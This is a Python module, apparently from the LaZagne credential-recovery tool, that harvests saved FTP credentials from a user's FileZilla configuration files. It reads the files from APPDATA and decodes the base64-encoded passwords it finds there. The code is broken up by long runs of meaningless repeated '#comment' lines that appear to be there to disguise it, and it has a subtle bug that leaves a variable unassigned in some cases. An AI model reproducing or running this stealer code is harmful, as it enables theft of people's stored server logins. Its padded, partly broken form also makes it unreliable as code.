# -*- coding: utf-8 -*-
import base64
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
from xml.etree.cElementTree import ElementTree
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1
from lazagne.config.module_info import ModuleInfo
from lazagne.config.constant import constant
#comment1#comment2#comment3#comment4
import os
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
class Filezilla(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, 'filezilla', 'sysadmin')
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
    def run(self):
        path = os.path.join(constant.profile['APPDATA'], u'FileZilla')
        if os.path.exists(path):
            pwd_found = []
            for file in [u'sitemanager.xml', u'recentservers.xml', u'filezilla.xml']:
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
                xml_file = os.path.join(path, file)
                if os.path.exists(xml_file):
                    tree = ElementTree(file=xml_file)
                    if tree.findall('Servers/Server'):
                        servers = tree.findall('Servers/Server')
                    else:
                        servers = tree.findall('RecentServers/Server')
#comment1#comment2#comment3#comment4#comment1#comment2#comment3
                    for server in servers:
                        host = server.find('Host')
                        port = server.find('Port')
                        login = server.find('User')
                        password = server.find('Pass')
#comment1#comment2#comment3#comment4#comment1#comment2#comment3                        
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4                   
                        if host is not None and port is not None and login is not None:
                            values = {
                                'Host': host.text,
                                'Port': port.text,
                                'Login': login.text,
                            }
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2
                        if password:
                            if 'encoding' in password.attrib and password.attrib['encoding'] == 'base64':
                                values['Password'] = base64.b64decode(password.text)
                            else:
                                values['Password'] = password.text
#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4#comment1#comment2#comment1#comment2#comment3#comment4#comment1#comment2#comment3#comment1#comment2#comment3#comment4
                        if values: 
                            pwd_found.append(values)
#comment1#comment2#comment3#comment4#comment1#comment2#comment3
            return pwd_found
